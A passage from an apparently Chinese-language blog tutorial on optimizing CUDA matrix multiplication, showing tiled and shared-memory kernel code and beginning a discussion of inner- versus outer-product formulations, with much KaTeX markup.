class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">matmul_tile2d_gpu</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-type">int</span> thread_num_x = gridDim.x * blockDim.x;<br>    <span class="hljs-type">int</span> thread_num_y = gridDim.y * blockDim.y;<br>    <span class="hljs-type">int</span> x_grid_loop = (m + thread_num_x - <span class="hljs-number">1</span>) / thread_num_x;<br>    <span class="hljs-type">int</span> y_grid_loop = (n + thread_num_y - <span class="hljs-number">1</span>) / thread_num_y;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> mm = <span class="hljs-number">0</span>; mm &lt; x_grid_loop; mm++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> nn = <span class="hljs-number">0</span>; nn &lt; y_grid_loop; nn++) &#123;<br>            <span class="hljs-type">int</span> x = mm * thread_num_x + blockIdx.x * blockDim.x + threadIdx.x;<br>            <span class="hljs-type">int</span> y = nn * thread_num_y + blockIdx.y * blockDim.y + threadIdx.y;<br>            <span class="hljs-type">float</span> v = <span class="hljs-number">0.0f</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>                v += a[x * k + i] * b[i * n + y];<br>            &#125;<br>            c[x * n + y] = v;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分析与性能数据-2">分析与性能数据</h3><p>性能数据：</p><h2 id="核函数的优化——共享内存">核函数的优化——共享内存</h2><h3 id="实现原理-3">实现原理</h3><p>矩阵乘中，仅优化计算次数是不够的。虽然时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>，但在 <code>matmul_tile2d_gpu</code> 核函数中，每个线程需要读取 <code>2k</code> 个数据，然后写入一个数据，一共需要读取 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>×</mo><mi>n</mi><mo>×</mo><mi>m</mi><mo>×</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">2 \times n \times m \times k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个数据。读取数据的速度很有可能比计算速度慢，成为程序提升性能的瓶颈。</p><p>类似于 CPU 中的高速缓存，CUDA 中也使用内存层次结构（memory hierarchy）来保证访问内存的速度。大多 GPU 中都存在容量较小的共享内存，它们位于芯片内部，访问延时是全局内存的二十到三十分之一，带宽却高了 10 倍。对应到物理层面，每个 SM 都有一个小的片上内存，被 SM 上执行的线程块中的所有线程所共享。共享内存使同一个线程块中可以相互协同，便于片上的内存可以被最大化的利用，降低回到全局内存读取的延迟。</p><p>在程序执行时，可先将部分经常访问的数据放入到共享内存中，减少重复访问全局内存的频率，从而提高程序运行速度。</p><p>CUDA 中一般用 <code>__shared__</code> 关键词描述数组，即可将数组放在共享内存上。但共享内存比全局内存要小很多，假设矩阵可以完全放入共享内存是不合理的。只能将矩阵进行切分后放入，正巧，我们已经把矩阵切分了！</p><p>但 <code>matmul_tile2d_gpu</code> 还缺少使用 <code>__shared__</code> 的数组。因此第一步就是先加上数组 as 和 bs，其数组大小设置为线程块的数量。但由于语法限制（变量不能作为数组的维度），我们不得不加入<br>C++ template 特性：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-type">int</span> BLOCK_SIZE_X, <span class="hljs-type">int</span> BLOCK_SIZE_Y, <span class="hljs-type">int</span> K&gt; <span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">matmul_tile2d_shared_gpu</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    __shared__ <span class="hljs-type">float</span> as[BLOCK_SIZE_X][K];</span></span><br><span class="hljs-params"><span class="hljs-function">    __shared__ <span class="hljs-type">float</span> bs[K][BLOCK_SIZE_Y];</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>然后自然就是把数据load进来，再计算：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> tidy = threadIdx.y;<br><span class="hljs-type">int</span> tidx = threadIdx.x;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>    as[tidx][i] = a[x * k + i];<br>    bs[i][tidy] = b[i * n + y];<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/PP/matmul_tile2d.gif" alt=""></p><p>最后把上面的改动整合一下，就是 <code>matmul_tile2d_shared_gpu</code> 的实现了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-type">int</span> BLOCK_SIZE_X, <span class="hljs-type">int</span> BLOCK_SIZE_Y, <span class="hljs-type">int</span> K&gt;<br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">matmul_tile2d_shared_gpu</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-type">int</span> thread_num_x = gridDim.x * blockDim.x;<br>    <span class="hljs-type">int</span> thread_num_y = gridDim.y * blockDim.y;<br>    <span class="hljs-type">int</span> tidy = threadIdx.y;<br>    <span class="hljs-type">int</span> tidx = threadIdx.x;<br>    <span class="hljs-type">int</span> x_grid_loop = (m + thread_num_x - <span class="hljs-number">1</span>) / thread_num_x;<br>    <span class="hljs-type">int</span> y_grid_loop = (n + thread_num_y - <span class="hljs-number">1</span>) / thread_num_y;<br>    __shared__ <span class="hljs-type">float</span> as[BLOCK_SIZE_X][K];<br>    __shared__ <span class="hljs-type">float</span> bs[K][BLOCK_SIZE_Y];<br>    <span class="hljs-built_in">assert</span>(x_grid_loop == y_grid_loop);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> mm = <span class="hljs-number">0</span>; mm &lt; x_grid_loop; mm++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> nn = <span class="hljs-number">0</span>; nn &lt; y_grid_loop; nn++) &#123;<br>            <span class="hljs-type">int</span> x = mm * thread_num_x + blockIdx.x * blockDim.x + threadIdx.x;<br>            <span class="hljs-type">int</span> y = nn * thread_num_y + blockIdx.y * blockDim.y + threadIdx.y;<br>            <span class="hljs-comment">// load data from global memory to shared memory</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>                as[tidx][i] = a[x * k + i];<br>                bs[i][tidy] = b[i * n + y];<br>            &#125;<br>            <span class="hljs-comment">// sub-matrix multiply</span><br>            <span class="hljs-type">float</span> v = <span class="hljs-number">0.0f</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>                v += as[tidx][i] * bs[i][tidy];<br>            &#125;<br>            <span class="hljs-comment">// store results into global memory</span><br>            c[x * n + y] = v;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分析与性能数据-3">分析与性能数据</h3><p>注意到，虽然我们将矩阵C的计算过程进行了分块，但我们的共享内存中仍存放了至少一整行的矩阵 A 和一整列的矩阵 B。这很容易导致 GPU 的共享内存溢出。也就是说，我们的矩阵分块方法还有待改进。</p><h2 id="矩阵乘外积——更好地适配共享内存">矩阵乘外积——更好地适配共享内存</h2><h3 id="矩阵乘内积与矩阵乘外积">矩阵乘内积与矩阵乘外积</h3><p>要想更好地切分矩阵，我们需要回忆一下前文介绍 naive GPU 版本的矩阵乘实现。在那里我提到过两种思路，一种是从线性代数课堂中学到的矩阵乘内积方法：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>0</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>0</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>0</mn></msub><msub><mi>B</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>0</mn></msub><msub><mi>B</mi><mn>1</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>0</mn></msub><msub><mi>B</mi><mn>2</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>0</mn></msub><msub><mi>B</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>1</mn></msub><msub><mi>B</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>1</mn></msub><msub><mi>B</mi><mn>1</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>1</mn></msub><msub><mi>B</mi><mn>2</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>1</mn></msub><msub><mi>B</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>2</mn></msub><msub><mi>B</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>2</mn></msub><msub><mi>B</mi><mn>1</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>2</mn></msub><msub><mi>B</mi><mn>2</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>2</mn></msub><msub><mi>B</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>3</mn></msub><msub><mi>B</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>3</mn></msub><msub><mi>B</mi><mn>1</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>3</mn></msub><msub><mi>B</mi><mn>2</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>3</mn></msub><msub><mi>B</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix}A_0 \\A_1 \\A_2 \\A_3\end{pmatrix}\begin{pmatrix}B_0 &amp; B_1 &amp; B_2 &amp; B_3\end{pmatrix}=\begin{pmatrix}A_0 B_0 &amp; A_0 B_1 &amp; A_0 B_2 &amp; A_0 B_3 \\A_1 B_0 &amp; A_1 B_1 &amp; A_1 B_2 &amp; A_1 B_3 \\A_2 B_0 &amp; A_2 B_1 &amp; A_2 B_2 &amp; A_2 B_3 \\A_3 B_0 &amp; A_3 B_1 &amp; A_3 B_2 &amp; A_3 B_3 \end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.8em;vertical-align:-2.15em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,1284c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-1292c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,1209c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-1344c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.8em;vertical-align:-2.15em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,1284c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-1292c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" 